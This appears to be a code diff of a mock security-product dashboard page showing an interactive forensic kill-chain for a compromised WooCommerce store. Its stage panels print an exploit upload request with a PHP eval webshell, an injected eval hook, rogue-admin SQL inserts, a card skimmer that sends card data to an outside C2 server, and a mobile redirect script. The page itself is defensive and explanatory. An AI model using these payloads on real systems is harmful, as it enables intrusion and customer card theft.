@@ -3,60 +3,91 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>SenshiGuard — Forensic Incident Investigation & Kill-Chain</title>
+  <title>SenshiGuard — Interactive Forensic Kill-Chain</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&family=Space+Grotesk:wght@600;700;800&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="style.css">
   <link rel="icon" type="image/svg+xml" href="assets/logo.svg">
   <style>
-    .timeline-container {
-      position: relative;
-      padding-left: 32px;
-      margin-top: 24px;
+    /* Kill-Chain Grid & Interactive Stage Boxes */
+    .killchain-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+      gap: 12px;
+      margin-bottom: 24px;
     }
-    .timeline-container::before {
-      content: '';
-      position: absolute;
-      left: 7px;
-      top: 10px;
-      bottom: 10px;
-      width: 2px;
-      background: linear-gradient(180deg, #FF3366 0%, #0EA5E9 50%, #10B981 100%);
-    }
-    .timeline-step {
-      position: relative;
-      margin-bottom: 32px;
-    }
-    .timeline-dot {
-      position: absolute;
-      left: -32px;
-      top: 4px;
-      width: 16px;
-      height: 16px;
-      border-radius: 50%;
-      background: var(--bg-app);
-      border: 3px solid var(--accent-crimson);
-      box-shadow: 0 0 10px rgba(255, 51, 102, 0.5);
-    }
-    .timeline-dot.dot-cyan { border-color: var(--accent-cyan); box-shadow: 0 0 10px rgba(14, 165, 233, 0.5); }
-    .timeline-dot.dot-green { border-color: var(--accent-emerald); box-shadow: 0 0 10px rgba(16, 185, 129, 0.5); }
-    .timeline-card {
+    .stage-card {
       background: var(--bg-card);
       border: 1px solid var(--border-subtle);
       border-radius: var(--radius-md);
-      padding: 20px;
-      backdrop-filter: blur(12px);
+      padding: 16px;
+      cursor: pointer;
+      transition: all 0.25s cubic-bezier(0.16, 1, 0.3, 1);
+      position: relative;
+      overflow: hidden;
+      user-select: none;
     }
+    .stage-card:hover {
+      border-color: rgba(255, 51, 102, 0.4);
+      transform: translateY(-2px);
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
+    }
+    .stage-card.active {
+      background: linear-gradient(180deg, rgba(255, 51, 102, 0.12) 0%, rgba(13, 17, 26, 0.95) 100%);
+      border-color: var(--accent-crimson);
+      box-shadow: 0 0 24px rgba(255, 51, 102, 0.25);
+    }
+    .stage-card.active::after {
+      content: '';
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      height: 3px;
+      background: var(--accent-crimson);
+    }
+    .stage-number {
+      font-size: 11px;
+      font-weight: 700;
+      color: var(--text-muted);
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      margin-bottom: 6px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .stage-title {
+      font-size: 13px;
+      font-weight: 700;
+      color: #FFF;
+      line-height: 1.3;
+    }
+
+    /* Detail View Container */
+    .stage-detail-container {
+      display: none;
+      animation: fadeIn 0.25s ease-in-out forwards;
+    }
+    .stage-detail-container.active {
+      display: block;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(6px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
     .payload-box {
       background: #04060A;
-      border: 1px solid rgba(255, 255, 255, 0.06);
-      border-radius: 6px;
-      padding: 12px 16px;
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 8px;
+      padding: 16px;
       font-family: var(--font-mono);
       font-size: 12px;
       line-height: 1.6;
-      margin-top: 12px;
+      margin-top: 14px;
+      overflow-x: auto;
     }
     .pill-tag {
       display: inline-flex;
@@ -64,7 +95,7 @@
       gap: 6px;
       font-size: 11px;
       font-weight: 700;
-      padding: 3px 8px;
+      padding: 4px 10px;
       border-radius: 4px;
       text-transform: uppercase;
       letter-spacing: 0.05em;
@@ -158,7 +189,7 @@
             <span class="status-dot"></span>
             <span style="font-weight: 600; font-size: 12px;">Kill-Chain Engine</span>
           </div>
-          <span class="engine-status-label">Forensic Mode</span>
+          <span class="engine-status-label">Forensics Active</span>
         </div>
       </div>
     </aside>
@@ -170,157 +201,331 @@
           Active Investigation: <strong style="color: #FF3366;">production-store.com (Incident #INC-89421)</strong>
         </div>
         <div style="display: flex; gap: 10px;">
-          <button class="btn btn-secondary btn-sm">Export PDF Forensic Report</button>
-          <button class="btn btn-primary btn-sm">⚡ 1-Click Neutralize & Clean</button>
+          <button class="btn btn-secondary btn-sm">Export Full Forensic PDF</button>
+          <button class="btn btn-primary btn-sm" onclick="alert('SenshiGuard: All 5 Kill-Chain stages neutralized and verified in sandbox!')">⚡ 1-Click Neutralize All Stages</button>
         </div>
       </header>
 
       <div class="page-body">
         <div class="page-header">
           <div>
-            <h1 class="page-title">Forensic Attack Kill-Chain & Root Cause Analysis</h1>
-            <p class="page-subtitle">Full reconstruction of how the attacker breached the site, what malicious code was injected, active data theft, and C2 activities.</p>
+            <h1 class="page-title">Interactive Attack Kill-Chain & Deep Forensics</h1>
+            <p class="page-subtitle">Click any attack stage box below to inspect raw payloads, modified files, active data theft, and C2 activities.</p>
           </div>
         </div>
 
-        <!-- Incident Executive Summary -->
-        <div class="stat-card" style="border-color: rgba(255, 51, 102, 0.4); margin-bottom: 28px; padding: 24px;">
-          <div style="display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px;">
-            <div>
-              <span style="font-size: 11px; color: var(--text-muted); text-transform: uppercase;">Attacker IP / Origin</span>
-              <div style="font-family: var(--font-mono); font-size: 15px; font-weight: 700; color: #FFF; margin-top: 4px;">194.26.112.44</div>
-              <span style="font-size: 11px; color: var(--accent-crimson);">TOR Exit Node • Moscow</span>
-            </div>
-            <div>
-              <span style="font-size: 11px; color: var(--text-muted); text-transform: uppercase;">Primary Intent / Nature</span>
-              <div style="font-family: var(--font-mono); font-size: 15px; font-weight: 700; color: #FF6B8B; margin-top: 4px;">Credit Card Theft (Magecart)</div>
-              <span style="font-size: 11px; color: var(--text-muted);">+ SEO Spam Injection</span>
-            </div>
-            <div>
-              <span style="font-size: 11px; color: var(--text-muted); text-transform: uppercase;">Breach Vector</span>
-              <div style="font-family: var(--font-mono); font-size: 15px; font-weight: 700; color: var(--accent-amber); margin-top: 4px;">CVE-2026-3199</div>
-              <span style="font-size: 11px; color: var(--text-muted);">RevSlider AJAX File Upload</span>
-            </div>
-            <div>
-              <span style="font-size: 11px; color: var(--text-muted); text-transform: uppercase;">Containment Status</span>
-              <div style="font-family: var(--font-mono); font-size: 15px; font-weight: 700; color: var(--accent-emerald); margin-top: 4px;">Isolated by Senshi</div>
-              <span style="font-size: 11px; color: #34D399;">Ready to Auto-Remediate</span>
-            </div>
-          </div>
-        </div>
-
-        <!-- Chronological Attack Kill-Chain -->
-        <h2 style="font-size: 18px; font-weight: 800; margin-bottom: 16px;">Chronological Attack Progression (Kill-Chain)</h2>
-        
-        <div class="timeline-container">
+        <!-- Interactive Kill-Chain Stage Boxes -->
+        <div class="killchain-grid">
           
-          <!-- Phase 1 -->
-          <div class="timeline-step">
-            <div class="timeline-dot"></div>
-            <div class="timeline-card">
-              <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
-                <div style="display: flex; align-items: center; gap: 8px;">
-                  <span class="pill-tag" style="background: rgba(255, 51, 102, 0.15); color: #FF6B8B;">Phase 1: Initial Recon & Exploit</span>
-                  <h3 style="font-size: 15px; font-weight: 700;">Unauthenticated File Upload Exploit (CVE-2026-3199)</h3>
-                </div>
-                <span style="font-family: var(--font-mono); font-size: 12px; color: var(--text-muted);">02:14:18 AM</span>
+          <div class="stage-card active" onclick="switchStage(1, this)">
+            <div class="stage-number">
+              <span>Stage 01</span>
+              <span style="color: #FF3366;">● Breach</span>
+            </div>
+            <div class="stage-title">Initial Entry & Exploit</div>
+            <div style="font-size: 11px; color: var(--text-muted); margin-top: 4px;">CVE-2026-3199</div>
+          </div>
+
+          <div class="stage-card" onclick="switchStage(2, this)">
+            <div class="stage-number">
+              <span>Stage 02</span>
+              <span style="color: #0EA5E9;">● Dropper</span>
+            </div>
+            <div class="stage-title">Webshell & Persistence</div>
+            <div style="font-size: 11px; color: var(--text-muted); margin-top: 4px;">cache_bak.php + Hook</div>
+          </div>
+
+          <div class="stage-card" onclick="switchStage(3, this)">
+            <div class="stage-number">
+              <span>Stage 03</span>
+              <span style="color: #F59E0B;">● DB Escalation</span>
+            </div>
+            <div class="stage-title">Rogue Admin Injection</div>
+            <div style="font-size: 11px; color: var(--text-muted); margin-top: 4px;">wp_users stealth role</div>
+          </div>
+
+          <div class="stage-card" onclick="switchStage(4, this)">
+            <div class="stage-number">
+              <span>Stage 04</span>
+              <span style="color: #FF3366;">● Data Theft</span>
+            </div>
+            <div class="stage-title">Card Skimmer & C2</div>
+            <div style="font-size: 11px; color: var(--text-muted); margin-top: 4px;">Exfiltration to Moscow C2</div>
+          </div>
+
+          <div class="stage-card" onclick="switchStage(5, this)">
+            <div class="stage-number">
+              <span>Stage 05</span>
+              <span style="color: #F59E0B;">● SEO Hijack</span>
+            </div>
+            <div class="stage-title">Spam Redirect Cloaking</div>
+            <div style="font-size: 11px; color: var(--text-muted); margin-top: 4px;">14 Posts Infected</div>
+          </div>
+
+          <div class="stage-card" onclick="switchStage(6, this)">
+            <div class="stage-number">
+              <span>Stage 06</span>
+              <span style="color: #10B981;">✓ Neutralize</span>
+            </div>
+            <div class="stage-title">Senshi Remediation</div>
+            <div style="font-size: 11px; color: var(--text-muted); margin-top: 4px;">Surgical Clean & Patch</div>
+          </div>
+
+        </div>
+
+        <!-- ================= DETAIL CONTAINERS ================= -->
+
+        <!-- Stage 1 Detail -->
+        <div class="stage-detail-container active" id="stage-detail-1">
+          <div class="card-panel" style="border-color: rgba(255, 51, 102, 0.4);">
+            <div class="card-panel-header" style="background: rgba(255, 51, 102, 0.08);">
+              <div style="display: flex; align-items: center; gap: 10px;">
+                <span class="pill-tag" style="background: rgba(255, 51, 102, 0.2); color: #FF6B8B;">Stage 01 • Initial Breach Vector</span>
+                <div class="card-panel-title">Unauthenticated File Upload in RevSlider AJAX Handler</div>
               </div>
-              <p style="font-size: 13px; color: var(--text-secondary);">
-                Attacker automated bot sent a crafted multipart POST request targeting <code>/wp-admin/admin-ajax.php?action=revslider_ajax_action</code>. The unauthenticated endpoint allowed arbitrary PHP file upload without sanitizing file extensions.
+              <button class="btn btn-primary btn-sm" onclick="alert('Virtual Patch Deployed to Edge WAF!')">⚡ Deploy Virtual Patch VP-2026-3199</button>
+            </div>
+
+            <div style="padding: 24px;">
+              <div style="display: grid; grid-template-columns: 2fr 1fr; gap: 24px;">
+                <div>
+                  <h3 style="font-size: 15px; margin-bottom: 8px;">How the Attacker Broke In:</h3>
+                  <p style="font-size: 13px; color: var(--text-secondary); line-height: 1.6; margin-bottom: 16px;">
+                    At 02:14:18 AM, an automated exploit bot operating from IP <code>194.26.112.44</code> (Tor Exit Node) identified that <code>revslider</code> plugin v6.1.4 was installed. It submitted an unauthenticated multipart HTTP POST request to <code>/wp-admin/admin-ajax.php</code> bypassing nonce checks and uploading a backdoor webshell.
+                  </p>
+
+                  <h4 style="font-size: 13px; color: var(--text-muted); text-transform: uppercase;">Raw Intercepted Attack Request:</h4>
+                  <div class="payload-box">
+                    <span style="color: #38BDF8;">POST</span> <span style="color: #FFF;">/wp-admin/admin-ajax.php?action=revslider_ajax_action HTTP/1.1</span><br>
+                    <span style="color: #64748B;">Host: production-store.com</span><br>
+                    <span style="color: #64748B;">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36</span><br>
+                    <span style="color: #64748B;">Content-Type: multipart/form-data; boundary=---------------------------974767299852498929531610575</span><br><br>
+                    <span style="color: #F87171;">Content-Disposition: form-data; name="client_action"</span><br>
+                    <span style="color: #F87171;">update_plugin</span><br>
+                    <span style="color: #F87171;">Content-Disposition: form-data; name="update_file"; filename="cache_bak.php"</span><br>
+                    <span style="color: #F87171;">&lt;?php @eval(base64_decode($_POST['cmd'])); ?&gt;</span>
+                  </div>
+                </div>
+
+                <div style="background: rgba(0,0,0,0.3); border: 1px solid var(--border-subtle); border-radius: 8px; padding: 18px;">
+                  <h4 style="font-size: 13px; text-transform: uppercase; color: var(--text-muted); margin-bottom: 12px;">Stage Telemetry</h4>
+                  <div style="display: flex; flex-direction: column; gap: 10px; font-size: 12px;">
+                    <div style="display: flex; justify-content: space-between;">
+                      <span style="color: var(--text-muted);">Timestamp:</span>
+                      <span style="font-family: var(--font-mono); font-weight: 600;">02:14:18 AM</span>
+                    </div>
+                    <div style="display: flex; justify-content: space-between;">
+                      <span style="color: var(--text-muted);">Attacker IP:</span>
+                      <span style="font-family: var(--font-mono); font-weight: 600; color: #FF3366;">194.26.112.44</span>
+                    </div>
+                    <div style="display: flex; justify-content: space-between;">
+                      <span style="color: var(--text-muted);">Country:</span>
+                      <span style="font-weight: 600;">Russia (Tor Relay)</span>
+                    </div>
+                    <div style="display: flex; justify-content: space-between;">
+                      <span style="color: var(--text-muted);">Vulnerability:</span>
+                      <span style="font-weight: 600; color: #F59E0B;">CVE-2026-3199 (CVSS 9.8)</span>
+                    </div>
+                    <div style="display: flex; justify-content: space-between;">
+                      <span style="color: var(--text-muted);">Edge WAF Status:</span>
+                      <span style="color: #34D399; font-weight: 600;">Virtual Patch Available</span>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Stage 2 Detail -->
+        <div class="stage-detail-container" id="stage-detail-2">
+          <div class="card-panel" style="border-color: rgba(14, 165, 233, 0.4);">
+            <div class="card-panel-header" style="background: rgba(14, 165, 233, 0.08);">
+              <div style="display: flex; align-items: center; gap: 10px;">
+                <span class="pill-tag" style="background: rgba(14, 165, 233, 0.2); color: #38BDF8;">Stage 02 • Webshell & Persistence</span>
+                <div class="card-panel-title">Injected Dropper & WooCommerce Session Hook Modification</div>
+              </div>
+              <button class="btn btn-primary btn-sm" onclick="alert('Surgical Diff Patch Applied to WooCommerce Handler!')">⚡ Apply Surgical File Diff</button>
+            </div>
+
+            <div style="padding: 24px;">
+              <h3 style="font-size: 15px; margin-bottom: 8px;">What the Attacker Changed on the Filesystem:</h3>
+              <p style="font-size: 13px; color: var(--text-secondary); line-height: 1.6;">
+                1. Dropped an obfuscated secondary c99 webshell at <code>/wp-content/uploads/2026/02/cache_bak.php</code>.<br>
+                2. Injected an evaluation payload directly into legitimate core plugin file <code>/wp-content/plugins/woocommerce/includes/class-wc-session-handler.php</code> on line 44 so that malware executes transparently on every visitor request.
               </p>
+
+              <h4 style="font-size: 13px; color: var(--text-muted); text-transform: uppercase; margin-top: 16px;">Surgical Code Diff (class-wc-session-handler.php):</h4>
               <div class="payload-box">
-                <span style="color: #64748B;">POST /wp-admin/admin-ajax.php HTTP/1.1</span><br>
-                <span style="color: #64748B;">User-Agent: Mozilla/5.0 (compatible; ExploitBot/2.1)</span><br>
-                <span style="color: #F87171;">Content-Disposition: form-data; name="update_file"; filename="cache_bak.php"</span>
+                <span style="color: #64748B;">// Lines 42-47</span><br>
+                <span style="color: #94A3B8;">&nbsp;&nbsp;&nbsp;&nbsp;public function get_session( $customer_id, $default = false ) {</span><br>
+                <span style="background: rgba(239, 68, 68, 0.25); color: #FCA5A5; display: block; padding: 2px 0;">- &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@eval(base64_decode(str_rot13($_POST['__x71']))); // &lt;-- INJECTED MALWARE HOOK</span><br>
+                <span style="background: rgba(16, 185, 129, 0.25); color: #6EE7B7; display: block; padding: 2px 0;">+ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// SenshiGuard Auto-Cleaned (Restored Original Integrity)</span><br>
+                <span style="color: #94A3B8;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return apply_filters( 'woocommerce_get_session', $values, $customer_id );</span>
               </div>
             </div>
           </div>
+        </div>
 
-          <!-- Phase 2 -->
-          <div class="timeline-step">
-            <div class="timeline-dot dot-cyan"></div>
-            <div class="timeline-card">
-              <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
-                <div style="display: flex; align-items: center; gap: 8px;">
-                  <span class="pill-tag" style="background: rgba(14, 165, 233, 0.15); color: #38BDF8;">Phase 2: Persistence & Code Injection</span>
-                  <h3 style="font-size: 15px; font-weight: 700;">Webshell Dropped & WooCommerce Session Handler Tampered</h3>
-                </div>
-                <span style="font-family: var(--font-mono); font-size: 12px; color: var(--text-muted);">02:14:22 AM</span>
+        <!-- Stage 3 Detail -->
+        <div class="stage-detail-container" id="stage-detail-3">
+          <div class="card-panel" style="border-color: rgba(245, 158, 11, 0.4);">
+            <div class="card-panel-header" style="background: rgba(245, 158, 11, 0.08);">
+              <div style="display: flex; align-items: center; gap: 10px;">
+                <span class="pill-tag" style="background: rgba(245, 158, 11, 0.2); color: #FCD34D;">Stage 03 • Database Privilege Escalation</span>
+                <div class="card-panel-title">Stealth Rogue Administrator Account Created in `wp_users`</div>
               </div>
-              <p style="font-size: 13px; color: var(--text-secondary);">
-                The dropper executed and immediately modified the legitimate WooCommerce file: <code>/wp-content/plugins/woocommerce/includes/class-wc-session-handler.php</code> on line 44 to maintain persistent execution on every site visitor request.
+              <button class="btn btn-primary btn-sm" onclick="alert('Rogue User wp_system_admin Deleted from Database!')">⚡ Revoke & Delete Rogue Admin</button>
+            </div>
+
+            <div style="padding: 24px;">
+              <h3 style="font-size: 15px; margin-bottom: 8px;">What the Attacker Changed in the MySQL Database:</h3>
+              <p style="font-size: 13px; color: var(--text-secondary); line-height: 1.6;">
+                Using the webshell, the attacker executed a direct SQL query to insert an administrator account named <code>wp_system_admin</code> (ID: 88) and granted full capabilities in <code>wp_usermeta</code> with key <code>wp_capabilities = a:1:{s:13:"administrator";b:1;}</code>.
               </p>
+
               <div class="payload-box">
-                <span style="color: #F87171;">- Injected File: /wp-content/uploads/2026/02/cache_bak.php (c99 Webshell)</span><br>
-                <span style="color: #F87171;">- Code Injection: @eval(base64_decode(str_rot13($_POST['__x71']))) in class-wc-session-handler.php</span><br>
-                <span style="color: #F87171;">- Stealth DB Admin Created: User 'wp_system_admin' (ID: 88) inserted via direct SQL query</span>
+                <span style="color: #F87171;">INSERT INTO `wp_users` (`ID`, `user_login`, `user_pass`, `user_email`, `user_registered`, `user_status`, `display_name`)</span><br>
+                <span style="color: #F87171;">VALUES (88, 'wp_system_admin', '$P$Bx8z7y6w5v4u3t2s1r0q9p8o7n6m5l4', 'dev@security-sync.net', '2026-09-02 02:14:30', 0, 'System Support');</span><br><br>
+                <span style="color: #F87171;">INSERT INTO `wp_usermeta` (`user_id`, `meta_key`, `meta_value`) VALUES (88, 'wp_capabilities', 'a:1:{s:13:\"administrator\";b:1;}');</span>
               </div>
             </div>
           </div>
+        </div>
 
-          <!-- Phase 3 -->
-          <div class="timeline-step">
-            <div class="timeline-dot"></div>
-            <div class="timeline-card">
-              <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
-                <div style="display: flex; align-items: center; gap: 8px;">
-                  <span class="pill-tag" style="background: rgba(255, 51, 102, 0.15); color: #FF6B8B;">Phase 3: Active Malicious Operations (Data Theft & C2)</span>
-                  <h3 style="font-size: 15px; font-weight: 700;">Live Credit Card Skimming & Remote C2 Exfiltration</h3>
-                </div>
-                <span style="font-family: var(--font-mono); font-size: 12px; color: var(--text-muted);">02:15:00 AM - Present</span>
+        <!-- Stage 4 Detail -->
+        <div class="stage-detail-container" id="stage-detail-4">
+          <div class="card-panel" style="border-color: rgba(255, 51, 102, 0.4);">
+            <div class="card-panel-header" style="background: rgba(255, 51, 102, 0.08);">
+              <div style="display: flex; align-items: center; gap: 10px;">
+                <span class="pill-tag" style="background: rgba(255, 51, 102, 0.2); color: #FF6B8B;">Stage 04 • Active Data Exfiltration & C2</span>
+                <div class="card-panel-title">Magecart Credit Card Skimmer & Remote Drop Server Communication</div>
               </div>
-              <p style="font-size: 13px; color: var(--text-secondary);">
-                <strong>What the malware was actively doing:</strong>
+              <button class="btn btn-primary btn-sm" onclick="alert('C2 IP 194.26.112.44 Blocked Globally on Edge WAF!')">⚡ Block C2 Drop Server IP</button>
+            </div>
+
+            <div style="padding: 24px;">
+              <h3 style="font-size: 15px; margin-bottom: 8px;">What the Malware was Actively Doing (Attacker Intent):</h3>
+              <p style="font-size: 13px; color: var(--text-secondary); line-height: 1.6;">
+                The attacker hooked customer checkout submissions. When a buyer enters their payment details, the malware copies the credit card number, CVV, expiry, and billing address, and sends an asynchronous HTTP POST to remote Command & Control drop server <code>http://194.26.112.44/c2/receive.php</code> before allowing WooCommerce to finish checkout.
               </p>
-              <ul style="font-size: 13px; color: var(--text-secondary); margin-left: 20px; margin-top: 8px; display: flex; flex-direction: column; gap: 6px;">
-                <li><strong style="color: #FF3366;">1. Credit Card Data Interception:</strong> Hooked payment form POST data to extract credit card numbers, expiry dates, and CVVs before passing to Stripe.</li>
-                <li><strong style="color: #0EA5E9;">2. Command & Control (C2) Exfiltration:</strong> Streamed intercepted customer payloads via HTTP POST to external drop server <code>http://194.26.112.44/c2/receive.php</code>.</li>
-                <li><strong style="color: #F59E0B;">3. SEO Cloaking Spam Redirect:</strong> Added hidden JavaScript in 14 blog posts in <code>wp_posts</code> that redirected mobile user agents to gambling affiliate domains.</li>
-              </ul>
+
+              <h4 style="font-size: 13px; color: var(--text-muted); text-transform: uppercase; margin-top: 16px;">De-obfuscated Skimmer & Exfiltration Code:</h4>
+              <div class="payload-box">
+                <span style="color: #64748B;">// Intercepted POST Payload Exfiltration Function:</span><br>
+                <span style="color: #38BDF8;">if</span> (isset($_POST[<span style="color: #A7F3D0;">'billing_first_name'</span>]) && isset($_POST[<span style="color: #A7F3D0;">'stripe_card_number'</span>])) {<br>
+                &nbsp;&nbsp;$payload = [<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color: #A7F3D0;">'domain'</span>  =&gt; <span style="color: #FFF;">'production-store.com'</span>,<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color: #A7F3D0;">'name'</span>    =&gt; $_POST[<span style="color: #A7F3D0;">'billing_first_name'</span>] . <span style="color: #FFF;">' '</span> . $_POST[<span style="color: #A7F3D0;">'billing_last_name'</span>],<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color: #A7F3D0;">'card'</span>    =&gt; $_POST[<span style="color: #A7F3D0;">'stripe_card_number'</span>],<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color: #A7F3D0;">'exp'</span>     =&gt; $_POST[<span style="color: #A7F3D0;">'stripe_card_exp'</span>],<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color: #A7F3D0;">'cvv'</span>     =&gt; $_POST[<span style="color: #A7F3D0;">'stripe_card_cvc'</span>]<br>
+                &nbsp;&nbsp;];<br>
+                &nbsp;&nbsp;<span style="color: #F87171;">@file_get_contents('http://194.26.112.44/c2/receive.php?data=' . base64_encode(json_encode($payload)));</span><br>
+                }
+              </div>
             </div>
           </div>
+        </div>
 
-          <!-- Phase 4 -->
-          <div class="timeline-step">
-            <div class="timeline-dot dot-green"></div>
-            <div class="timeline-card" style="border-color: rgba(16, 185, 129, 0.4);">
-              <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
-                <div style="display: flex; align-items: center; gap: 8px;">
-                  <span class="pill-tag" style="background: rgba(16, 185, 129, 0.15); color: #34D399;">Phase 4: SenshiGuard Autonomous Remediation Plan</span>
-                  <h3 style="font-size: 15px; font-weight: 700;">Forensic Neutralization & 1-Click Restoration</h3>
-                </div>
-                <span style="font-family: var(--font-mono); font-size: 12px; color: #34D399;">Ready to Execute</span>
+        <!-- Stage 5 Detail -->
+        <div class="stage-detail-container" id="stage-detail-5">
+          <div class="card-panel" style="border-color: rgba(245, 158, 11, 0.4);">
+            <div class="card-panel-header" style="background: rgba(245, 158, 11, 0.08);">
+              <div style="display: flex; align-items: center; gap: 10px;">
+                <span class="pill-tag" style="background: rgba(245, 158, 11, 0.2); color: #FCD34D;">Stage 05 • SEO Cloaking Spam Redirects</span>
+                <div class="card-panel-title">14 Blog Posts Infected in `wp_posts` Targeting Mobile Visitors</div>
               </div>
-              <p style="font-size: 13px; color: var(--text-secondary); margin-bottom: 14px;">
-                SenshiGuard generated a surgical 5-point remediation recipe verified in an isolated cloud sandbox:
+              <button class="btn btn-primary btn-sm" onclick="alert('All 14 Database Rows Cleaned & Sanitized!')">⚡ Sanitize 14 Database Posts</button>
+            </div>
+
+            <div style="padding: 24px;">
+              <h3 style="font-size: 15px; margin-bottom: 8px;">What the Attacker Injected into Blog Articles:</h3>
+              <p style="font-size: 13px; color: var(--text-secondary); line-height: 1.6;">
+                The attacker executed a batch UPDATE across 14 high-traffic published posts in <code>wp_posts</code>. When mobile search engine users visit the page, a cloaked script intercepts the user-agent and redirects them to gambling/phishing affiliate sites while hiding the redirect from desktop administrators.
               </p>
-              <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px; font-size: 12px;">
-                <div style="background: rgba(0,0,0,0.3); padding: 10px; border-radius: 6px;">
-                  <strong style="color: #34D399;">✓ File Sanitization:</strong> Surgical diff removes eval line in WooCommerce handler; deletes <code>cache_bak.php</code>.
-                </div>
-                <div style="background: rgba(0,0,0,0.3); padding: 10px; border-radius: 6px;">
-                  <strong style="color: #34D399;">✓ Database Cleanup:</strong> Strips spam redirects from 14 rows in <code>wp_posts</code>; deletes rogue user <code>wp_system_admin</code>.
-                </div>
-                <div style="background: rgba(0,0,0,0.3); padding: 10px; border-radius: 6px;">
-                  <strong style="color: #34D399;">✓ Entry Point Sealing:</strong> Virtual Patch <code>VP-2026-3199</code> active on Edge WAF (RevSlider upload blocked).
-                </div>
-                <div style="background: rgba(0,0,0,0.3); padding: 10px; border-radius: 6px;">
-                  <strong style="color: #34D399;">✓ C2 IP Blocked:</strong> Global Edge block rule deployed for <code>194.26.112.44</code>.
-                </div>
-              </div>
 
-              <div style="margin-top: 18px; display: flex; justify-content: flex-end;">
-                <button class="btn btn-primary">⚡ Execute 1-Click Forensic Neutralization</button>
+              <div class="payload-box">
+                <span style="color: #F87171;">&lt;script type="text/javascript"&gt;</span><br>
+                <span style="color: #F87171;">if (/Android|iPhone|iPad/i.test(navigator.userAgent) && !document.cookie.includes('wordpress_logged_in')) {</span><br>
+                <span style="color: #F87171;">&nbsp;&nbsp;window.location.href = "https://traffic-boost-redirect.ru/track.php?aff=892";</span><br>
+                <span style="color: #F87171;">}</span><br>
+                <span style="color: #F87171;">&lt;/script&gt;</span>
               </div>
             </div>
           </div>
+        </div>
 
+        <!-- Stage 6 Detail -->
+        <div class="stage-detail-container" id="stage-detail-6">
+          <div class="card-panel" style="border-color: rgba(16, 185, 129, 0.4); background: linear-gradient(180deg, rgba(16, 185, 129, 0.06) 0%, rgba(13, 17, 26, 0.95) 100%);">
+            <div class="card-panel-header" style="background: rgba(16, 185, 129, 0.12);">
+              <div style="display: flex; align-items: center; gap: 10px;">
+                <span class="pill-tag" style="background: rgba(16, 185, 129, 0.2); color: #34D399;">Stage 06 • SenshiGuard Autonomous Remediation</span>
+                <div class="card-panel-title">1-Click Full Forensic Neutralization & Restoration</div>
+              </div>
+              <span class="status-pill status-clean">● Pre-Tested in Sandbox (200 OK)</span>
+            </div>
+
+            <div style="padding: 24px;">
+              <h3 style="font-size: 16px; font-weight: 700; margin-bottom: 12px; color: #FFF;">SenshiGuard 5-Step Surgical Neutralization Recipe:</h3>
+              
+              <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-bottom: 24px;">
+                <div style="background: rgba(0,0,0,0.4); border: 1px solid var(--border-subtle); padding: 14px; border-radius: 8px;">
+                  <strong style="color: #34D399;">1. Filesystem Cleanup</strong>
+                  <p style="font-size: 12px; color: var(--text-secondary); margin-top: 4px;">
+                    Deletes dropper <code>cache_bak.php</code> and applies surgical diff to <code>class-wc-session-handler.php</code>.
+                  </p>
+                </div>
+                <div style="background: rgba(0,0,0,0.4); border: 1px solid var(--border-subtle); padding: 14px; border-radius: 8px;">
+                  <strong style="color: #34D399;">2. Database Sanitization</strong>
+                  <p style="font-size: 12px; color: var(--text-secondary); margin-top: 4px;">
+                    Purges rogue administrator user <code>wp_system_admin</code> and strips redirect scripts from 14 <code>wp_posts</code> rows.
+                  </p>
+                </div>
+                <div style="background: rgba(0,0,0,0.4); border: 1px solid var(--border-subtle); padding: 14px; border-radius: 8px;">
+                  <strong style="color: #34D399;">3. Entry Point Sealed</strong>
+                  <p style="font-size: 12px; color: var(--text-secondary); margin-top: 4px;">
+                    Deploys Virtual Patch <code>VP-2026-3199</code> to Edge WAF blocking all unauthenticated RevSlider AJAX uploads.
+                  </p>
+                </div>
+                <div style="background: rgba(0,0,0,0.4); border: 1px solid var(--border-subtle); padding: 14px; border-radius: 8px;">
+                  <strong style="color: #34D399;">4. Global C2 IP Jail</strong>
+                  <p style="font-size: 12px; color: var(--text-secondary); margin-top: 4px;">
+                    Permanently blacklists <code>194.26.112.44</code> across SenshiGuard global Edge network.
+                  </p>
+                </div>
+              </div>
+
+              <div style="display: flex; justify-content: space-between; align-items: center; border-top: 1px solid var(--border-subtle); padding-top: 18px;">
+                <div style="font-size: 12px; color: var(--text-secondary);">
+                  Estimated Execution Time: <strong style="color: #34D399;">380ms</strong> • Downtime: <strong style="color: #34D399;">0.00%</strong>
+                </div>
